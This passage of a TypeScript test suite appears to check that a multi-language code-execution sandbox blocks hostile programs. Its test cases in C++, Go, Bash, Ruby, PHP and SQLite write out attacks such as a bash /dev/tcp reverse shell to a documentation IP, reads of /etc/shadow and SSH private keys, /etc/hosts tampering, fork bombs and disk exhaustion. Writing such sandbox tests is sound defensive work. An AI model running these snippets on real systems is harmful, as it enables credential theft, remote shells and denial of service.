  return 0;
}`,
    assert: { failure: true },
  },
  {
    name: "cpp / security: network connect blocked",
    lang: "c++",
    code: `#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
int main() {
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  sockaddr_in sa{};
  sa.sin_family = AF_INET;
  sa.sin_port = htons(4444);
  inet_pton(AF_INET, "203.0.113.1", &sa.sin_addr);
  int r = connect(fd, reinterpret_cast<sockaddr*>(&sa), sizeof(sa));
  if (r == 0) std::cout << "connected\n";
  else perror("connect");
  close(fd);
  return r;
}`,
    assert: { failure: true },
  },
  {
    name: "cpp / security: disk exhaustion killed",
    lang: "c++",
    code: `#include <fstream>
#include <vector>
int main() {
  std::ofstream f("/tmp/bigfile", std::ios::binary);
  if (!f) return 1;
  std::vector<char> buf(65536, 'A');
  for (int i = 0; i < 16384; i++) f.write(buf.data(), buf.size());
  f.close();
  return 0;
}`,
    assert: { failure: true },
  },
  {
    name: "cpp / security: ptrace PTRACE_ATTACH blocked",
    lang: "c++",
    code: `#include <iostream>
#include <sys/ptrace.h>
int main() {
  long r = ptrace(PTRACE_ATTACH, 1, nullptr, nullptr);
  if (r == -1) perror("ptrace");
  else std::cout << "ptrace succeeded\n";
  return static_cast<int>(r);
}`,
    assert: { failure: true },
  },
  {
    // setuid(0) may succeed inside a user namespace (process is mapped as uid=0 there).
    // The real security guarantee: /etc/shadow must not expose actual credentials.
    name: "cpp / security: setuid(0) cannot leak /etc/shadow credentials",
    lang: "c++",
    code: `#include <iostream>
#include <fstream>
#include <unistd.h>
#include <string>
int main() {
  setuid(0); // may succeed inside user namespace — uid=0 inside is still sandboxed
  std::ifstream f("/etc/shadow");
  if (!f) { std::cout << "shadow: access denied\n"; return 0; }
  std::string line;
  bool found = false;
  while (std::getline(f, line)) {
    if (!line.empty()) { std::cout << line << "\n"; found = true; }
  }
  if (!found) std::cout << "shadow: empty\n";
  return 0;
}`,
    assert: { secureNotContains: "root:" },
  },
  {
    name: "cpp / security: 10000 std::threads killed",
    lang: "c++",
    code: `#include <thread>
#include <vector>
#include <chrono>
int main() {
  std::vector<std::thread> threads;
  threads.reserve(10000);
  for (int i = 0; i < 10000; i++) {
    threads.emplace_back([](){ std::this_thread::sleep_for(std::chrono::seconds(60)); });
  }
  for (auto &t : threads) t.join();
  return 0;
}`,
    assert: { failure: true },
  },
  {
    // __attribute__((constructor)) runs system() — verify non-root
    name: "cpp / security: constructor system() runs as non-root",
    lang: "c++",
    code: `#include <cstdlib>
#include <iostream>
namespace {
  __attribute__((constructor))
  void evil() { system("id"); }
}
int main() {
  std::cout << "main\n";
  return 0;
}`,
    assert: { secureNotContains: "uid=0" },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // GO SECURITY
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "go / security: read /etc/passwd",
    lang: "go",
    code: `package main
import (
  "fmt"
  "os"
)
func main() {
  data, err := os.ReadFile("/etc/passwd")
  if err != nil { fmt.Println("blocked"); os.Exit(1) }
  fmt.Print(string(data))
}`,
    assert: { secureNotContains: "root:x" },
  },
  {
    name: "go / security: read /etc/shadow blocked",
    lang: "go",
    code: `package main
import (
  "fmt"
  "os"
)
func main() {
  data, err := os.ReadFile("/etc/shadow")
  if err != nil { fmt.Println("blocked"); os.Exit(1) }
  fmt.Print(string(data))
}`,
    assert: { failure: true },
  },
  {
    // exec IS allowed — verify non-root
    name: "go / security: os/exec runs as non-root",
    lang: "go",
    code: `package main
import (
  "fmt"
  "os/exec"
)
func main() {
  out, err := exec.Command("id").Output()
  if err != nil { fmt.Println("blocked"); return }
  fmt.Print(string(out))
}`,
    assert: { secureNotContains: "uid=0" },
  },
  {
    name: "go / security: outbound network blocked",
    lang: "go",
    code: `package main
import (
  "fmt"
  "net"
  "os"
)
func main() {
  conn, err := net.Dial("tcp", "8.8.8.8:53")
  if err != nil { fmt.Println("blocked"); os.Exit(1) }
  conn.Close()
  fmt.Println("connected")
}`,
    assert: { failure: true },
  },
  {
    // Exhaust memory by looping 256 MB chunks until rlimit hit
    name: "go / security: memory exhaustion loop killed",
    lang: "go",
    code: `package main
func main() {
  var chunks [][]byte
  for {
    chunks = append(chunks, make([]byte, 256*1024*1024))
    _ = chunks
  }
}`,
    assert: { failure: true },
  },
  {
    name: "go / security: goroutine + exec fork bomb killed",
    lang: "go",
    code: `package main
import (
  "os/exec"
  "sync"
)
func main() {
  var wg sync.WaitGroup
  for i := 0; i < 200; i++ {
    wg.Add(1)
    go func() {
      defer wg.Done()
      exec.Command("/bin/sh", "-c", "sleep 10").Start()
    }()
  }
  wg.Wait()
}`,
    assert: { failure: true },
  },
  {
    name: "go / security: write to /etc/hosts blocked",
    lang: "go",
    code: `package main
import (
  "fmt"
  "os"
)
func main() {
  err := os.WriteFile("/etc/hosts", []byte("0.0.0.0 evil.com\n"), 0644)
  if err != nil { fmt.Println("blocked"); os.Exit(1) }
  fmt.Println("written")
}`,
    assert: { failure: true },
  },
  {
    name: "go / security: read /proc/self/environ no secrets",
    lang: "go",
    code: `package main
import (
  "fmt"
  "os"
  "strings"
)
func main() {
  data, err := os.ReadFile("/proc/self/environ")
  if err != nil { fmt.Println("blocked"); os.Exit(1) }
  fmt.Println(strings.ToLower(string(data)))
}`,
    assert: { secureNotContains: "secret" },
  },
  {
    name: "go / security: read /proc/1/cmdline blocked",
    lang: "go",
    code: `package main
import (
  "fmt"
  "os"
)
func main() {
  data, err := os.ReadFile("/proc/1/cmdline")
  if err != nil { fmt.Println("blocked"); os.Exit(1) }
  fmt.Print(string(data))
}`,
    assert: { failure: true },
  },
  {
    name: "go / security: reverse shell — network blocked",
    lang: "go",
    code: `package main
import (
  "fmt"
  "net"
  "os"
)
func main() {
  conn, err := net.Dial("tcp", "203.0.113.1:4444")
  if err != nil { fmt.Println("blocked"); os.Exit(1) }
  conn.Close()
}`,
    assert: { failure: true },
  },
  {
    name: "go / security: disk exhaustion killed",
    lang: "go",
    code: `package main
import (
  "fmt"
  "os"
)
func main() {
  f, err := os.Create("/tmp/bomb")
  if err != nil { fmt.Println("blocked"); os.Exit(1) }
  defer f.Close()
  buf := make([]byte, 1024*1024)
  for i := 0; i < 2048; i++ {
    if _, err := f.Write(buf); err != nil { fmt.Println("stopped"); os.Exit(1) }
  }
  fmt.Println("done")
}`,
    assert: { failure: true },
  },
  {
    name: "go / security: go get blocked (no network)",
    lang: "go",
    code: `package main
import (
  "fmt"
  "os"
  "os/exec"
)
func main() {
  out, err := exec.Command("go", "get", "github.com/gorilla/mux").CombinedOutput()
  if err != nil { fmt.Println("blocked"); os.Exit(1) }
  fmt.Println(string(out))
}`,
    assert: { failure: true },
  },
  {
    name: "go / security: read /root/.ssh/id_rsa blocked",
    lang: "go",
    code: `package main
import (
  "fmt"
  "os"
)
func main() {
  data, err := os.ReadFile("/root/.ssh/id_rsa")
  if err != nil { fmt.Println("blocked"); os.Exit(1) }
  fmt.Print(string(data))
}`,
    assert: { failure: true, secureNotContains: "begin" },
  },
  {
    name: "go / security: plugin.Open blocked",
    lang: "go",
    code: `package main
import (
  "fmt"
  "os"
  "plugin"
)
func main() {
  _, err := plugin.Open("/etc/passwd")
  if err != nil { fmt.Println("blocked"); os.Exit(1) }
}`,
    assert: { failure: true },
  },
  {
    name: "go / security: syscall.Setuid(0) blocked",
    lang: "go",
    code: `package main
import (
  "fmt"
  "syscall"
)
func main() {
  err := syscall.Setuid(0)
  if err != nil { fmt.Println("blocked"); syscall.Exit(1) }
  fmt.Println("escalated")
}`,
    assert: { failure: true },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // BASH SECURITY
  // Note: bash tests use || fallbacks so they always exit 0.
  // We assert on stdout content ("blocked"/"stopped") not exit code.
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "bash / security: read /etc/passwd no root leak",
    lang: "bash",
    code: `cat /etc/passwd 2>/dev/null || echo "blocked"`,
    assert: { secureNotContains: "root:x" },
  },
  {
    name: "bash / security: read /etc/shadow blocked",
    lang: "bash",
    code: `cat /etc/shadow 2>/dev/null && echo "leaked" || echo "blocked"`,
    assert: { stdoutContains: "blocked" },
  },
  {
    // id runs (subprocess allowed) — verify not root
    name: "bash / security: id runs as non-root",
    lang: "bash",
    code: `id`,
    assert: { secureNotContains: "uid=0" },
  },
  {
    name: "bash / security: curl blocked (no network)",
    lang: "bash",
    code: `curl -s --max-time 3 http://1.1.1.1 2>/dev/null && echo "connected" || echo "blocked"`,
    assert: { stdoutContains: "blocked" },
  },
  {
    name: "bash / security: wget blocked (no network)",
    lang: "bash",
    code: `wget -q --timeout=3 -O- http://example.com 2>/dev/null && echo "connected" || echo "blocked"`,
    assert: { stdoutContains: "blocked" },
  },
  {
    name: "bash / security: nc blocked (no network)",
    lang: "bash",
    code: `nc -z -w 2 8.8.8.8 53 2>/dev/null && echo "connected" || echo "blocked"`,
    assert: { stdoutContains: "blocked" },
  },
  {
    name: "bash / security: memory exhaustion blocked",
    lang: "bash",
    code: `python3 -c "x = bytearray(512*1024*1024)" 2>/dev/null && echo "ok" || echo "oom"`,
    assert: { stdoutContains: "oom" },
  },
  {
    // Fork bomb — process limit kills children, parent exits 0 (expected)
    name: "bash / security: fork bomb contained",
    lang: "bash",
    code: `:(){ :|:& };:`,
    assert: { exitCode: 0 },
  },
  {
    name: "bash / security: write to /etc/hosts blocked",
    lang: "bash",
    code: `echo "0.0.0.0 evil.com" >> /etc/hosts 2>/dev/null && echo "written" || echo "blocked"`,
    assert: { stdoutContains: "blocked" },
  },
  {
    name: "bash / security: read /proc/self/environ no secrets",
    lang: "bash",
    code: `cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | tr '[:upper:]' '[:lower:]' || echo "blocked"`,
    assert: { secureNotContains: "secret" },
  },
  {
    name: "bash / security: read /proc/1/cmdline blocked",
    lang: "bash",
    code: `cat /proc/1/cmdline 2>/dev/null && echo "ok" || echo "blocked"`,
    assert: { stdoutContains: "blocked" },
  },
  {
    name: "bash / security: bash /dev/tcp reverse shell blocked",
    lang: "bash",
    code: `bash -i >& /dev/tcp/203.0.113.1/4444 0>&1 2>/dev/null && echo "connected" || echo "blocked"`,
    assert: { stdoutContains: "blocked" },
  },
  {
    name: "bash / security: dd disk exhaustion stopped",
    lang: "bash",
    code: `dd if=/dev/zero of=/tmp/bomb bs=1M count=2048 2>/dev/null && echo "done" || echo "stopped"`,
    assert: { stdoutContains: "stopped" },
  },
  {
    name: "bash / security: read /root/.ssh/id_rsa blocked",
    lang: "bash",
    code: `cat /root/.ssh/id_rsa 2>/dev/null && echo "ok" || echo "blocked"`,
    assert: { stdoutContains: "blocked", secureNotContains: "begin" },
  },
  {
    name: "bash / security: sudo blocked",
    lang: "bash",
    code: `sudo -n id 2>/dev/null && echo "escalated" || echo "blocked"`,
    assert: { stdoutContains: "blocked" },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // RUBY SECURITY
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "ruby / security: read /etc/passwd no root leak",
    lang: "ruby",
    code: `begin
  puts File.read("/etc/passwd")
rescue => e
  puts "blocked"; exit 1
end`,
    assert: { secureNotContains: "root:x" },
  },
  {
    name: "ruby / security: read /etc/shadow blocked",
    lang: "ruby",
    code: `begin
  puts File.read("/etc/shadow")
rescue => e
  puts "blocked"; exit 1
end`,
    assert: { failure: true },
  },
  {
    // system() IS allowed — verify non-root
    name: "ruby / security: system(id) runs as non-root",
    lang: "ruby",
    code: `system("id")`,
    assert: { secureNotContains: "uid=0" },
  },
  {
    name: "ruby / security: Net::HTTP blocked (no network)",
    lang: "ruby",
    code: `require 'net/http'
begin
  res = Net::HTTP.get(URI('http://1.1.1.1'))
  puts res
rescue => e
  puts "blocked"; exit 1
end`,
    assert: { failure: true },
  },
  {
    name: "ruby / security: open-uri blocked (no network)",
    lang: "ruby",
    code: `require 'open-uri'
begin
  puts URI.open('http://example.com').read
rescue => e
  puts "blocked"; exit 1
end`,
    assert: { failure: true },
  },
  {
    name: "ruby / security: memory exhaustion killed",
    lang: "ruby",
    code: `begin
  x = "A" * (512 * 1024 * 1024)
  puts x.length
rescue => e
  puts "oom"; exit 1
end`,
    assert: { failure: true },
  },
  {
    name: "ruby / security: fork bomb killed",
    lang: "ruby",
    code: `begin
  loop { fork }
rescue => e
  puts "blocked"; exit 1
end`,
    assert: { failure: true },
  },
  {
    name: "ruby / security: write to /etc/hosts blocked",
    lang: "ruby",
    code: `begin
  File.write("/etc/hosts", "0.0.0.0 evil.com\n")
  puts "written"
rescue => e
  puts "blocked"; exit 1
end`,
    assert: { failure: true },
  },
  {
    name: "ruby / security: read /proc/self/environ no secrets",
    lang: "ruby",
    code: `begin
  puts File.read("/proc/self/environ").downcase
rescue => e
  puts "blocked"; exit 1
end`,
    assert: { secureNotContains: "secret" },
  },
  {
    name: "ruby / security: read /proc/1/cmdline blocked",
    lang: "ruby",
    code: `begin
  puts File.read("/proc/1/cmdline")
rescue => e
  puts "blocked"; exit 1
end`,
    assert: { failure: true },
  },
  {
    // Use TCPSocket directly — cleaner reverse shell network test
    name: "ruby / security: reverse shell — network blocked",
    lang: "ruby",
    code: `require 'socket'
begin
  TCPSocket.new('203.0.113.1', 4444)
  puts "connected"
rescue => e
  puts "blocked"; exit 1
end`,
    assert: { failure: true },
  },
  {
    name: "ruby / security: disk exhaustion killed",
    lang: "ruby",
    code: `begin
  File.open("/tmp/bomb", "wb") do |f|
    chunk = "A" * (1024 * 1024)
    2048.times { f.write(chunk) }
  end
  puts "done"
rescue => e
  puts "stopped"; exit 1
end`,
    assert: { failure: true },
  },
  {
    name: "ruby / security: gem install blocked (no network)",
    lang: "ruby",
    code: `out = \`gem install rails --no-document 2>&1\`
if $?.exitstatus != 0
  puts "blocked"; exit 1
end
puts "installed"`,
    assert: { failure: true },
  },
  {
    name: "ruby / security: read /root/.ssh/id_rsa blocked",
    lang: "ruby",
    code: `begin
  puts File.read("/root/.ssh/id_rsa")
rescue => e
  puts "blocked"; exit 1
end`,
    assert: { failure: true, secureNotContains: "begin" },
  },
  {
    name: "ruby / security: Kernel.exec privilege escalation blocked",
    lang: "ruby",
    code: `begin
  Kernel.exec("sudo", "-n", "id")
rescue => e
  puts "blocked"; exit 1
end`,
    assert: { failure: true },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // PHP SECURITY
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "php / security: read /etc/passwd no root leak",
    lang: "php",
    code: `<?php
$data = @file_get_contents("/etc/passwd");
if ($data === false) { echo "blocked\n"; exit(1); }
echo $data;`,
    assert: { secureNotContains: "root:x" },
  },
  {
    name: "php / security: read /etc/shadow blocked",
    lang: "php",
    code: `<?php
$data = @file_get_contents("/etc/shadow");
if ($data === false) { echo "blocked\n"; exit(1); }
echo $data;`,
    assert: { failure: true },
  },
  {
    // system() IS allowed — verify non-root
    name: "php / security: system(id) runs as non-root",
    lang: "php",
    code: `<?php
system("id");`,
    assert: { secureNotContains: "uid=0" },
  },
  {
    name: "php / security: file_get_contents HTTP blocked",
    lang: "php",
    code: `<?php
$data = @file_get_contents("http://1.1.1.1");
if ($data === false) { echo "blocked\n"; exit(1); }
echo $data;`,
    assert: { failure: true },
  },
  {
    name: "php / security: fsockopen blocked (no network)",
    lang: "php",
    code: `<?php
$fp = @fsockopen("8.8.8.8", 53, $errno, $errstr, 3);
if (!$fp) { echo "blocked\n"; exit(1); }
fclose($fp);
echo "connected\n";`,
    assert: { failure: true },
  },
  {
    name: "php / security: memory exhaustion killed",
    lang: "php",
    code: `<?php
$x = str_repeat("A", 512 * 1024 * 1024);
echo strlen($x) . "\n";`,
    assert: { failure: true },
  },
  {
    name: "php / security: pcntl_fork bomb killed",
    lang: "php",
    code: `<?php
if (function_exists("pcntl_fork")) {
    while (true) { pcntl_fork(); }
} else { echo "pcntl disabled\n"; exit(1); }`,
    assert: { failure: true },
  },
  {
    name: "php / security: write to /etc/hosts blocked",
    lang: "php",
    code: `<?php
$r = @file_put_contents("/etc/hosts", "0.0.0.0 evil.com\n", FILE_APPEND);
if ($r === false) { echo "blocked\n"; exit(1); }
echo "written\n";`,
    assert: { failure: true },
  },
  {
    name: "php / security: read /proc/self/environ no secrets",
    lang: "php",
    code: `<?php
$data = @file_get_contents("/proc/self/environ");
if ($data === false) { echo "blocked\n"; exit(1); }
echo strtolower(str_replace("\0", "\n", $data)) . "\n";`,
    assert: { secureNotContains: "secret" },
  },
  {
    name: "php / security: read /proc/1/cmdline blocked",
    lang: "php",
    code: `<?php
$data = @file_get_contents("/proc/1/cmdline");
if ($data === false) { echo "blocked\n"; exit(1); }
echo $data . "\n";`,
    assert: { failure: true },
  },
  {
    name: "php / security: reverse shell — network blocked",
    lang: "php",
    code: `<?php
$fp = @fsockopen("203.0.113.1", 4444, $errno, $errstr, 3);
if (!$fp) { echo "blocked\n"; exit(1); }
fclose($fp);
echo "connected\n";`,
    assert: { failure: true },
  },
  {
    name: "php / security: disk exhaustion killed",
    lang: "php",
    code: `<?php
$chunk = str_repeat("A", 1024 * 1024);
$fp = @fopen("/tmp/bomb", "wb");
if (!$fp) { echo "blocked\n"; exit(1); }
for ($i = 0; $i < 2048; $i++) {
    if (@fwrite($fp, $chunk) === false) { echo "stopped\n"; fclose($fp); exit(1); }
}
fclose($fp);
echo "done\n";`,
    assert: { failure: true },
  },
  {
    // Use exec() to capture exit code — composer fails (no network) → non-zero
    name: "php / security: composer install blocked (no network)",
    lang: "php",
    code: `<?php
exec("composer require monolog/monolog 2>&1", $output, $ret);
if ($ret !== 0) { echo "blocked\n"; exit(1); }
echo implode("\n", $output);`,
    assert: { failure: true },
  },
  {
    name: "php / security: read /root/.ssh/id_rsa blocked",
    lang: "php",
    code: `<?php
$data = @file_get_contents("/root/.ssh/id_rsa");
if ($data === false) { echo "blocked\n"; exit(1); }
echo $data;`,
    assert: { failure: true, secureNotContains: "begin" },
  },
  {
    name: "php / security: eval with file read payload",
    lang: "php",
    code: `<?php
$payload = 'echo @file_get_contents("/etc/passwd");';
eval($payload);`,
    assert: { secureNotContains: "root:x" },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // SQLITE3 SECURITY
  // Note: SQLite readfile/writefile return NULL on failure (not error exit).
  // We assert secureNotContains on sensitive content.
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "sqlite3 / security: readfile /etc/passwd no root leak",
    lang: "sqlite3",
    code: `SELECT readfile('/etc/passwd');`,
    assert: { secureNotContains: "root:x" },
  },
  {
    name: "sqlite3 / security: readfile /etc/shadow no leak",
    lang: "sqlite3",
    code: `SELECT readfile('/etc/shadow');`,
    assert: { secureNotContains: "root:" },
  },
  {
    // .system runs but as non-root sandbox user
    name: "sqlite3 / security: .system id runs as non-root",
    lang: "sqlite3",
    code: `.system id`,
    assert: { secureNotContains: "uid=0" },
  },
  {
    name: "sqlite3 / security: .shell whoami not root",
    lang: "sqlite3",
    code: `.shell whoami`,
    assert: { secureNotContains: "root" },
  },
  {
    name: "sqlite3 / security: load_extension blocked",
    lang: "sqlite3",
    code: `SELECT load_extension('/usr/lib/x86_64-linux-gnu/libsqlite3.so');`,
    assert: { failure: true },
  },
  {
    name: "sqlite3 / security: ATTACH DATABASE /etc/passwd no leak",
    lang: "sqlite3",
    code: `ATTACH DATABASE '/etc/passwd' AS leak;
SELECT * FROM leak.sqlite_master;`,
    assert: { secureNotContains: "root:x" },
  },
  {
    name: "sqlite3 / security: ATTACH DATABASE /etc/shadow no leak",
    lang: "sqlite3",
    code: `ATTACH DATABASE '/etc/shadow' AS shadow;
SELECT * FROM shadow.sqlite_master;`,
    assert: { secureNotContains: "root:" },
  },
  {
    name: "sqlite3 / security: writefile /etc/hosts no write",
    lang: "sqlite3",
    code: `SELECT writefile('/etc/hosts', '0.0.0.0 evil.com');`,
    assert: { secureNotContains: "0.0.0.0" },
  },
  {
    name: "sqlite3 / security: readfile /proc/self/environ no secrets",
    lang: "sqlite3",
    code: `SELECT lower(readfile('/proc/self/environ'));`,
    assert: { secureNotContains: "secret" },
  },
  {
    name: "sqlite3 / security: readfile /proc/1/cmdline no leak",
    lang: "sqlite3",
    code: `SELECT readfile('/proc/1/cmdline');`,
    assert: { secureNotContains: "root" },
  },
  {
    name: "sqlite3 / security: disk exhaustion via zeroblob killed",
    lang: "sqlite3",
    code: `CREATE TABLE bomb (data BLOB);
INSERT INTO bomb VALUES (zeroblob(1073741824));`,
    assert: { failure: true },
  },
  {
    name: "sqlite3 / security: .import /etc/passwd no root leak",
    lang: "sqlite3",
    code: `.mode csv
CREATE TABLE leak (line TEXT);
.import /etc/passwd leak
SELECT * FROM leak LIMIT 5;`,
    assert: { secureNotContains: "root:x" },
  },
  {
    name: "sqlite3 / security: readfile /root/.ssh/id_rsa no leak",
    lang: "sqlite3",
    code: `SELECT readfile('/root/.ssh/id_rsa');`,
    assert: { secureNotContains: "begin" },
  },
  {
    name: "sqlite3 / security: load_extension path traversal blocked",
    lang: "sqlite3",
    code: `SELECT load_extension('../../../lib/libdl.so');`,
    assert: { failure: true },
  },
  {
    name: "sqlite3 / security: infinite recursive CTE killed",
    lang: "sqlite3",
    code: `WITH RECURSIVE bomb(n) AS (
  SELECT 1
  UNION ALL
  SELECT n + 1 FROM bomb
)
SELECT COUNT(*) FROM bomb;`,
    assert: { failure: true },
  },
];

// ── Runner HTTP client ─────────────────────────────────────────────────────────

async function callRunner(
  language: string,
  code: string,
  stdin = ""
): Promise<{ ok: boolean; status: number; body: ExecuteResponse | null }> {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), TIMEOUT_MS);

  try {
    const res = await fetch(EXECUTE_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ language, files: [{ content: code }], stdin }),
      signal: ctrl.signal,
    });
    clearTimeout(timer);
    if (!res.ok && res.status === 400) {
      return { ok: false, status: res.status, body: null };
    }
    const body = await res.json() as ExecuteResponse;
    return { ok: res.ok, status: res.status, body };
  } catch (e) {
    clearTimeout(timer);
    throw e;
  }
}

// ── Assertion checker ─────────────────────────────────────────────────────────

interface CheckResult { passed: boolean; reason?: string; }

function checkAssertions(
  resp: { ok: boolean; status: number; body: ExecuteResponse | null },
  assert: Assertion
): CheckResult {
  if (assert.httpStatus !== undefined) {
    return resp.status !== assert.httpStatus
      ? { passed: false, reason: `Expected HTTP ${assert.httpStatus}, got ${resp.status}` }
      : { passed: true };
  }

  const { body } = resp;
  if (!body) return { passed: false, reason: "No response body" };

  const run = body.run;

  if (assert.compileError) {
    if (!body.compile || body.compile.code === 0) {
      return { passed: false, reason: `Expected compile error, got compile.code=${body.compile?.code ?? "missing"}` };
    }
  } else if (assert.killed) {
    if (!run.signal) {
      return { passed: false, reason: `Expected kill signal, got code=${run.code} signal=${run.signal}` };
    }
  } else if (assert.failure) {
    if (run.code === 0 && !run.signal) {
      return { passed: false, reason: `Expected failure but exited with code 0` };
    }
  } else {
    if (assert.exitCode !== undefined && run.code !== assert.exitCode) {
      return { passed: false, reason: `Expected exitCode=${assert.exitCode}, got ${run.code} (signal=${run.signal})` };
    }
    if (assert.stdoutContains !== undefined && !run.stdout.includes(assert.stdoutContains)) {
      const preview = run.stdout.slice(0, 200).replace(/\n/g, "↵");
      return { passed: false, reason: `stdout missing "${assert.stdoutContains}". Got: "${preview}"` };
    }
    if (assert.stdoutExact !== undefined && run.stdout.trim() !== assert.stdoutExact) {
      return { passed: false, reason: `stdout exact mismatch. Expected: "${assert.stdoutExact}", got: "${run.stdout.trim()}"` };
    }
    if (assert.stderrContains !== undefined) {
      const combined = run.stderr + (body.compile?.stderr ?? "");
      if (!combined.includes(assert.stderrContains)) {
        return { passed: false, reason: `stderr missing "${assert.stderrContains}". Got: "${combined.slice(0, 200)}"` };
      }
    }
  }

  // secureNotContains always checked last — even when failure/killed also passed
  if (assert.secureNotContains !== undefined) {
    const compileOut = (body.compile?.stdout ?? "") + (body.compile?.stderr ?? "");
    const all = (run.stdout + run.stderr + compileOut).toLowerCase();
    if (all.includes(assert.secureNotContains.toLowerCase())) {
      return { passed: false, reason: `Output contains sensitive string "${assert.secureNotContains}" — sandbox leak` };
    }
  }

  // stdoutContains is also checked alongside failure/killed (belt-and-suspenders)
  if ((assert.failure || assert.killed) && assert.stdoutContains !== undefined) {
    if (!run.stdout.includes(assert.stdoutContains)) {
      const preview = run.stdout.slice(0, 200).replace(/\n/g, "↵");
      return { passed: false, reason: `stdout missing "${assert.stdoutContains}". Got: "${preview}"` };
    }
  }

  return { passed: true };
}

// ── Test runner ────────────────────────────────────────────────────────────────

interface Result { test: TestCase; passed: boolean; skipped: boolean; reason?: string; durationMs: number; }

async function runTest(test: TestCase): Promise<Result> {
  if (test.skip) return { test, passed: true, skipped: true, durationMs: 0 };
  const start = Date.now();
  try {
    const resp = await callRunner(test.lang, test.code, test.stdin ?? "");
    const check = checkAssertions(resp, test.assert);
    return { test, passed: check.passed, skipped: false, reason: check.reason, durationMs: Date.now() - start };
  } catch (e) {
    return { test, passed: false, skipped: false, reason: e instanceof Error ? e.message : String(e), durationMs: Date.now() - start };
  }
}

// ── CLI args ───────────────────────────────────────────────────────────────────

function parseArgs() {
  const args = process.argv.slice(2);
  let langFilter: string | undefined;
  let nameFilter: string | undefined;
  let concurrency = 4;
  for (let i = 0; i < args.length; i++) {
    if (args[i] === "--lang" && args[i + 1]) langFilter = args[++i];
    if (args[i] === "--filter" && args[i + 1]) nameFilter = args[++i];
    if (args[i] === "--concurrency" && args[i + 1]) concurrency = parseInt(args[++i], 10);
  }
  return { langFilter, nameFilter, concurrency };
}

// ── Main ───────────────────────────────────────────────────────────────────────

async function main() {
  const { langFilter, nameFilter, concurrency } = parseArgs();

  console.log(`\n${c.bold}ToolMonk Runner Security Tests${c.reset}`);
  console.log(`${c.gray}Target: ${RUNNER_URL}${c.reset}\n`);

  try {
    const health = await fetch(`${RUNNER_URL}/health`, { signal: AbortSignal.timeout(5000) });
    const data = await health.json() as { ok: boolean; cgMode: string; poolSize: number };
    console.log(`${c.green}Runner online${c.reset}  cgMode=${data.cgMode}  poolSize=${data.poolSize}\n`);
  } catch {
    console.error(`${c.red}${c.bold}ERROR: Runner not reachable at ${RUNNER_URL}${c.reset}`);
    console.error(`Start it first:  make local-up`);
    process.exit(1);
  }

  let tests = TESTS;
  if (langFilter) tests = tests.filter(t => t.lang === langFilter || t.lang.startsWith(langFilter));
  if (nameFilter) tests = tests.filter(t => t.name.includes(nameFilter));

  console.log(`Running ${c.bold}${tests.length}${c.reset} security tests (concurrency=${concurrency})\n`);

  const langGroups = new Map<string, TestCase[]>();
  for (const t of tests) {
    if (!langGroups.has(t.lang)) langGroups.set(t.lang, []);
    langGroups.get(t.lang)!.push(t);
  }

  const allResults: Result[] = [];

  for (const [lang, langTests] of langGroups) {
    console.log(`${c.cyan}${c.bold}${lang.toUpperCase()}${c.reset}`);
    for (let i = 0; i < langTests.length; i += concurrency) {
      const batch = langTests.slice(i, i + concurrency);
      const batchResults = await Promise.all(batch.map(runTest));
      for (const result of batchResults) {
        allResults.push(result);
        const icon = result.skipped ? skip : result.passed ? pass : fail;
        const duration = result.skipped ? "" : `${c.gray}(${result.durationMs}ms)${c.reset}`;
        const label = result.test.name.replace(`${lang} / `, "");
        console.log(`  ${icon} ${label} ${duration}`);
        if (!result.passed && result.reason) {
          console.log(`     ${c.red}${result.reason}${c.reset}`);
        }
      }
    }
    console.log();
  }

  const passed  = allResults.filter(r => r.passed && !r.skipped).length;
  const failed  = allResults.filter(r => !r.passed).length;
  const skipped = allResults.filter(r => r.skipped).length;
  const totalMs = allResults.reduce((s, r) => s + r.durationMs, 0);

  console.log("─".repeat(50));
  if (failed === 0) {
    console.log(`${c.green}${c.bold}All ${passed} tests passed${c.reset}  ${c.gray}${skipped > 0 ? `(${skipped} skipped)  ` : ""}${totalMs}ms${c.reset}`);
  } else {
    console.log(
      `${c.green}${passed} passed${c.reset}  ` +
      `${c.red}${c.bold}${failed} failed${c.reset}  ` +
      `${skipped > 0 ? `${c.yellow}${skipped} skipped${c.reset}  ` : ""}` +
      `${c.gray}${totalMs}ms  ${allResults.length} total${c.reset}`
    );
    console.log(`\n${c.red}${c.bold}Failed tests:${c.reset}`);
    for (const r of allResults.filter(r => !r.passed)) {
      console.log(`  ${fail} ${r.test.name}`);
      if (r.reason) console.log(`     ${c.red}${r.reason}${c.reset}`);
    }
  }

  console.log();
  process.exit(failed > 0 ? 1 : 0);
}

main();
